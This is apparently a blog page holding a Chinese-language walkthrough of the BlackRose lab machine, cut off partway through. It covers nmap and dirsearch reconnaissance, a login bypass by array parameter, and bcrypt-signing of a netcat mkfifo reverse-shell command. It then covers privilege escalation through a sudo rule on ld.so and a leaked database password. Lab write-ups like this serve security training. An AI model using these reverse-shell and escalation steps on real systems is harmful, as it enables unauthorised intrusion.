@@ -1,0 +1,857 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BlackRose 靶机信息收集1234567┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;blackrose]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.21  PORT     STATE SERVICE22&#x2F;tcp   open  ssh80&#x2F;tcp   open  http3306&#x2F;tcp open  mysql  1234┌──(k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BlackRose 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/fcad96c9b901.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="BlackRose 靶机信息收集1234567┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;blackrose]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.21  PORT     STATE SERVICE22&#x2F;tcp   open  ssh80&#x2F;tcp   open  http3306&#x2F;tcp open  mysql  1234┌──(k">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9cde899b7b9f79eb135cb0187b011225_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/547f297ad14243c400e32bc6dd22d4ff_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/812b6d71f7a9e3975a601f3d745c8eed_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ef45912ca09e9e22ed6b8eb9a5233832_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/633c65181503478dd2d7daa589012356_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/184bbbf9e93259975c916b1bd663e485_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/63b5b545336912571c11149966c3a7a1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e2678307adfa062e1095ba4353e9f997_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/611abcc4d23f236799c70524b45da926_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4a6367546426370b0b6f6854a8abd16f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7699795bd41e0f3ef8c87c7f75e9ac0a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/48cca41cc16207ba75769d4b248c5154_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/932d8c6ac801535da99ae33e66bef49b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/45e2a6a9cfc947509b30f61c7cda40dd_MD5.png">
+<meta property="article:published_time" content="2023-10-12T14:36:47.000Z">
+<meta property="article:modified_time" content="2023-10-15T13:10:18.903Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/9cde899b7b9f79eb135cb0187b011225_MD5.png">
+  
+  
+  
+  <title>BlackRose 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BlackRose 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-12 22:36" pubdate>
+          2023年10月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          218 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BlackRose 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="BlackRose-靶机"><a href="#BlackRose-靶机" class="headerlink" title="BlackRose 靶机"></a>BlackRose 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.21  <br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ mysql 192.168.1.21 -u root -p <br>Enter password: <br>ERROR 2002 (HY000): Can<span class="hljs-string">&#x27;t connect to local server through socket &#x27;</span>/run/mysqld/mysqld.sock<span class="hljs-string">&#x27; (2)</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,3306 192.168.1.21          <br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 d1:9b:10:88:15:e9:7a:c4:1a:29:07:3c:21:87:c4:ac (RSA)<br>|   256 e3:50:0b:c9:e8:f1:68:7f:e7:cf:ec:de:7b:b9:20:a1 (ECDSA)<br>|_  256 55:0e:96:22:cc:50:20:d9:<span class="hljs-built_in">dd</span>:c2:ff:5b:25:d0:d7:2b (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| http-title: BlackRose<br>|_Requested resource was login.php<br>3306/tcp open  mysql   MySQL (unauthorized)<br><br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nmap --script=vuln -p22,80,3306 192.168.1.21 <br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|       httponly flag not <span class="hljs-built_in">set</span><br>|   /login.php: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /login.php: Possible admin folder</span><br><span class="hljs-string">3306/tcp open  mysql</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>打开页面，只有登录框，尝试了一下简单的 SQL 注入，没成功。尝试注册个新用户，看看有没有越权之类的逻辑漏洞，没发现。</p>
+<p>登陆后看起来有个执行命令的地方，但我并不是 admin，无法执行。</p>
+<p><img src="/pic/9cde899b7b9f79eb135cb0187b011225_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo dirsearch -u http://192.168.1.21  <br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Target: http://192.168.1.21/<br><br>[05:27:16] Starting: <br>[05:27:17] 301 -  309B  - /js  -&gt;  http://192.168.1.21/js/                                                <br>[05:27:19] 200 -   21B  - /404.php                                          <br>[05:27:31] 301 -  310B  - /css  -&gt;  http://192.168.1.21/css/                <br>[05:27:31] 302 -    0B  - /database.php  -&gt;  404.php                        <br>[05:27:33] 200 -   21B  - /footer.php                                       <br>[05:27:34] 200 -   21B  - /header.php                                       <br>[05:27:34] 301 -  313B  - /images  -&gt;  http://192.168.1.21/images/          <br>[05:27:34] 302 -    0B  - /images/  -&gt;  ../404.php                          <br>[05:27:35] 301 -  310B  - /img  -&gt;  http://192.168.1.21/img/                <br>[05:27:35] 302 -    0B  - /index.php  -&gt;  login.php                         <br>[05:27:35] 302 -    0B  - /index.php/login/  -&gt;  login.php                  <br>[05:27:36] 302 -    0B  - /js/  -&gt;  ../404.php                              <br>[05:27:37] 200 -    1KB - /login.php                                        <br>[05:27:37] 302 -    0B  - /logout.php  -&gt;  404.php                          <br>[05:27:43] 200 -    2KB - /register.php                                     <br>[05:27:44] 403 -  277B  - /server-status/                                   <br>[05:27:44] 403 -  277B  - /server-status<br>[05:27:49] 302 -    0B  - /vendors/  -&gt;  ../404.php <br></code></pre></td></tr></table></figure>
+
+<p>目录爆破未发现新的暴露面。</p>
+<p>尝试了弱口令爆破，失败。对执行命令的接口使用 Burp 自带的字典进行 FUZZ，失败。</p>
+<p><img src="/pic/547f297ad14243c400e32bc6dd22d4ff_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h2><p>在这里卡了蛮久的，没什么思路，就跑去看 WP 里，里面提到了登录绕过，谷歌搜索 login bypass</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/login-bypass">Login Bypass - HackTricks</a></p>
+<p><img src="/pic/812b6d71f7a9e3975a601f3d745c8eed_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 passwd 后加 <code>[]</code> 绕过登录成功，登陆到了 admin 用户</p>
+<p><img src="/pic/ef45912ca09e9e22ed6b8eb9a5233832_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>indexcsrf 过期得蛮快的，如果提示 timeout 的话就刷新下网页，似乎只能使用 whoami 命令，别的命令会提示</p>
+<p><img src="/pic/633c65181503478dd2d7daa589012356_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>把 Signature 的值复制下来，john 爆破一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo john <span class="hljs-built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt  <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (bcrypt [Blowfish 32/64 X3])<br>Cost 1 (iteration count) is 1024 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br><span class="hljs-built_in">whoami</span>           (?)     <br></code></pre></td></tr></table></figure>
+
+<p>似乎 Signature 的值必须是命令的加密值，哈希是 Bcrypt 算法，随便找了个在线网站<a target="_blank" rel="noopener" href="https://bcrypt-generator.com/">Bcrypt-Generator.com - Generate, Check, Hash, Decode Bcrypt Strings</a>，得到了 <code>id</code> 的加密值，验证了自己的猜测。</p>
+<p>找个反弹 shell 的代码，可以多换几个试试，有的成功有的失败</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> <span class="hljs-number">443</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/184bbbf9e93259975c916b1bd663e485_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过在线网站得到了加密后的值</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">$<span class="hljs-number">2</span>a$<span class="hljs-number">10</span>$v<span class="hljs-number">49</span>VHI<span class="hljs-attr">VsiGtoUeTaZdbTuuaWpnkS92</span><span class="hljs-meta">o5</span>/<span class="hljs-name">G5</span>MZaHloHkFWRr<span class="hljs-meta">o7</span>buoq<br></code></pre></td></tr></table></figure>
+
+<p>在网页中直接修改源代码，再点击 <code>Run</code></p>
+<p><img src="/pic/63b5b545336912571c11149966c3a7a1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>反弹 shell 成功。需要备注的是，这里可能需要反复换反弹 shell 的代码，有些反弹代码是不成功的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.21] 51246<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1121): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@BlackRose:/var/www/html$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@BlackRose:/var/www/html$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@BlackRose:/var/www/html$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:98:92:98 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.21/24 brd 192.168.1.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe98:9298/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@BlackRose:/var/www/html$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux BlackRose 4.15.0-69-generic <span class="hljs-comment">#78-Ubuntu SMP Wed Nov 6 11:30:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@BlackRose:/var/www/html$ sudo -l      <br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on BlackRose:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User www-data may run the following commands on BlackRose:<br>    (delx : delx) NOPASSWD: /bin/ld.so<br></code></pre></td></tr></table></figure>
+
+<p>sudo -l 感觉得到了有用的信息</p>
+<p><img src="/pic/e2678307adfa062e1095ba4353e9f997_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>gtfobins 中找到了利用手法，</p>
+<p>这个内核版本感觉可以内核提权。先信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@BlackRose:/var/www/html$ sudo -u delx /bin/ld.so /bin/bash -p<br>sudo -u delx /bin/ld.so /bin/bash -p<br><span class="hljs-built_in">whoami</span><br>delx<br><span class="hljs-built_in">id</span><br>uid=1002(delx) gid=1002(delx) <span class="hljs-built_in">groups</span>=1002(delx)<br><span class="hljs-built_in">ls</span> -alih /home<br>total 16K<br>1179649 drwxr-xr-x  4 root     root     4.0K Nov  9  2019 .<br>      2 drwxr-xr-x 24 root     root     4.0K Nov 13  2019 ..<br>1179652 drwxr-xr-x  6 delx     delx     4.0K Dec  5  2019 delx<br>1183766 drwx------  5 yourname yourname 4.0K Dec  5  2019 yourname<br></code></pre></td></tr></table></figure>
+
+<p>先看看网站根目录吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alih<br>total 76K<br> 266386 drwxr-xr-x  8 root root 4.0K Jul 11  2020 .<br>3153970 drwxr-xr-x  3 root root 4.0K Nov  7  2019 ..<br> 266400 -rw-r--r--  1 root root   37 Nov 13  2019 404.php<br> 262153 -rw-r--r--  1 root root 1.2K Dec  5  2019 RL.php<br> 262150 -rw-r--r--  1 root root 1.2K Nov 26  2019 RP.php<br> 262148 -rw-r--r--  1 root root  956 Nov 26  2019 Rx.php<br> 397314 drwxrwxr-x  5 root root 4.0K Oct 22  2019 bootstrap<br> 793475 drwxrwxr-x  2 root root 4.0K Nov 15  2019 css<br> 266801 -rw-r--r--  1 root root 1.4K Nov 10  2019 database.php<br> 397308 -rw-r--r--  1 root root  303 Dec  1  2019 footer.php<br> 262152 -rw-r--r--  1 root root  364 Dec  1  2019 header.php<br> 924595 drwxrwxr-x  2 root root 4.0K Oct 22  2019 images<br> 397310 drwxrwxrwx  2 root root 4.0K Dec  5  2019 img<br> 262151 -rw-r--r--  1 root root 3.6K Nov 26  2019 index.php<br> 666484 drwxrwxr-x  2 root root 4.0K Nov 13  2019 js<br> 397363 -rw-rw-r--  1 root root 1.2K Nov 26  2019 login.php<br> 397364 -rw-r--r--  1 root root  198 Dec  1  2019 logout.php<br> 397309 -rw-rw-r--  1 root root 1.3K Dec  1  2019 register.php<br> 793409 drwxrwxr-x 20 root root 4.0K Oct 22  2019 vendors<br></code></pre></td></tr></table></figure>
+
+<p>网站根目录中有 database.php 文件，其中包含数据库密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">define(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>define(<span class="hljs-string">&quot;pass&quot;</span>, <span class="hljs-string">&quot;howareyoubuddy&quot;</span>);<br>define(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;Dw&quot;</span>);<br>define(<span class="hljs-string">&quot;host&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>尝试用此密码切换登录，失败</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">ls</span> -alih<br>total 36K<br>1179652 drwxr-xr-x 6 delx delx 4.0K Dec  5  2019 .<br>1179649 drwxr-xr-x 4 root root 4.0K Nov  9  2019 ..<br>1183918 lrwxrwxrwx 1 delx delx    9 Dec  3  2019 .bash_history -&gt; /dev/null<br>1179654 -rw-r--r-- 1 delx delx  220 Nov  7  2019 .bash_logout<br>1179655 -rw-r--r-- 1 delx delx 3.7K Dec  3  2019 .bashrc<br>1183761 drwx------ 2 delx delx 4.0K Nov  7  2019 .cache<br>1183759 drwx------ 3 delx delx 4.0K Nov  7  2019 .gnupg<br>1575430 drwxrwxr-x 3 delx delx 4.0K Dec  1  2019 .<span class="hljs-built_in">local</span><br>1179653 -rw-r--r-- 1 